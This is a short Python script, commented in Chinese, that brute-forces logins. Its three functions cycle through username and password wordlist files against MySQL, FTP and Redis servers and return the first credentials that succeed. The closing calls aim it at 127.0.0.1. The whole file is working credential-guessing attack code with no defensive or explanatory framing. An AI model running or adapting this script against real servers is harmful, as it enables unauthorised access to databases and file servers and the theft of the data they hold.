import pymysql  # 用于连接 MySQL 数据库
from ftplib import FTP  # 用于连接 FTP 服务器
import redis  # 用于连接 Redis 数据库

"""
MySQL 弱口令
"""


# host, port: 目标主机和端口；
# user_dict, pwd_dict: 用户名或密码文件路径，默认值 'root'。
def blast_mysql(host, port, user_dict='root', pwd_dict='root'):
    # 爆破密码
    if user_dict == 'root':
        for pwd in open(pwd_dict, 'r').readlines():
            pwd = pwd.strip()
            # 如果连接成功（未抛异常）：
            # 说明密码正确；
            # 关闭连接并返回 [user, pwd]。
            try:
                db = pymysql.connect(host=host, port=port, user=user_dict, password=pwd, connect_timeout=5)
                db.close()
                return [user_dict, pwd]
            except:
                pass
    # 爆破账号
    elif pwd_dict == 'root':
        for user in open(user_dict, 'r').readlines():
            user = user.strip()
            try:
                db = pymysql.connect(host=host, port=port, user=user, password=pwd_dict)
                db.close()
                return [user, pwd_dict]
            except:
                pass
    # 爆破账号和密码
    else:
        for user in open(user_dict, 'r').readlines():
            for pwd in open(pwd_dict, 'r').readlines():
                user = user.strip()
                pwd = pwd.strip()
                try:
                    db = pymysql.connect(host=host, port=port, user=user, password=pwd)
                    db.close()
                    return [user, pwd]
                except:
                    pass
    return '爆破失败'


def blast_ftp(host, port, user_dict, pwd_dict):
    ftp = FTP()
    for user in open(user_dict, 'r').readlines():
        for pwd in open(pwd_dict, 'r').readlines():
            user = user.replace('\n', '')
            pwd = pwd.replace('\n', '')
            try:
                print(user, pwd)
                ftp.connect(host=host, port=port,timeout=0.5)
                ftp.login(user=user, passwd=pwd)
                return [user, pwd]
            except:
                # print(1)
                pass
    return '爆破失败'


def blast_redis(host, port, pwd_dict):
    for pwd in open(pwd_dict, 'r').readlines():
        pwd = pwd.replace('\n', '')
        try:
            red = redis.Redis(host=host, port=port, password=pwd)
            red.info()
            return pwd
        except:
            pass
    return '爆破失败'


# res = blast_mysql('127.0.0.1', 3306, pwd_dict='test/pwd.txt')
# print(res)
res = blast_ftp('127.0.0.1',21,pwd_dict='test_2/pwd.txt',user_dict='test_2/users.txt')
print(res)
# res = blast_redis('127.0.0.1', 6379, pwd_dict='pwd.txt')
# print(res)